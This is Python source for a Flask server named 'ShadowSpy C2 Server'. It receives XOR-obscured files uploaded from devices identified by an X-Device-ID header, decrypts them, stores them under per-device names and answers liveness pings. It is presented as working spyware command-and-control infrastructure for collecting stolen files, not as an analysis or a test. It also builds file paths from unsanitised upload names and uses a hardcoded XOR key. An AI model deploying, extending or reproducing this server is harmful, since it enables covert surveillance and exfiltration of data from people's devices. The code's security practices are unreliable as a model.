import os
import hashlib
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Basic AES-like encryption key (for demo)
ENCRYPTION_KEY = b'local-shadowspy-key-32bytes-long!!'

def simple_decrypt(data: bytes) -> bytes:
    # XOR with key for basic "encryption" demo
    key = ENCRYPTION_KEY * (len(data) // len(ENCRYPTION_KEY) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)]))

@app.route('/upload', methods=['POST'])
def upload():
    device_id = request.headers.get('X-Device-ID', 'unknown')
    file = request.files.get('file')
    if not file:
        return jsonify({"status": "error", "message": "No file"}), 400
    
    encrypted_data = file.read()
    decrypted = simple_decrypt(encrypted_data)
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{device_id}_{timestamp}_{file.filename}"
    path = os.path.join(UPLOAD_FOLDER, filename)
    
    with open(path, 'wb') as f:
        f.write(decrypted)
    
    print(f"[+] Received file from {device_id}: {filename}")
    return jsonify({"status": "success"})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive", "time": datetime.datetime.now().isoformat()})

if __name__ == '__main__':
    print("ShadowSpy C2 Server running on http://localhost:5000")
    print("Uploads go to ./uploads/")
    app.run(host='0.0.0.0', port=5000, debug=False)